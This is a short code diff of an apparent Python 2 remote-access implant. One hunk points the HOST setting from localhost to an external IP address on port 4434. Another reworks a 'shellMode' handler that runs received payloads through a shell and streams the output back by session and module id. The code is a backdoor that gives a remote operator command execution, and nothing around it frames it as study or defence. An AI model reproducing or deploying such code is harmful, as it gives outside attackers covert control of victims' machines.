@@ -18,8 +18,8 @@ import datetime
 import zlib
 import shutil
 
-#HOST = '109.172.189.74'
-HOST = '127.0.0.1'
+HOST = '109.172.189.74'
+#HOST = '127.0.0.1'
 PORT = 4434
 ACTIVE = False
 
@@ -194,9 +194,14 @@ while 1:
                     elif self.data['mode'] == 'shellMode':
                         execproc = subprocess.Popen(self.data['payload'], shell=True,
                                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        for line in iter(execproc.stdout.readline, ''):
+                        while True:
+                            time.sleep(0.1)
+                            line = execproc.stdout.readline()
+                            if not line:
+                                print 'break'
+                                break
                             data_send(line, self.data['mode'], session_id=self.data['session_id'], module_id=self.data['module_id'])
-                            time.sleep(0.01)
+                            print "SEND %s" % line
 
                         output = 'endCommandExecute'
 
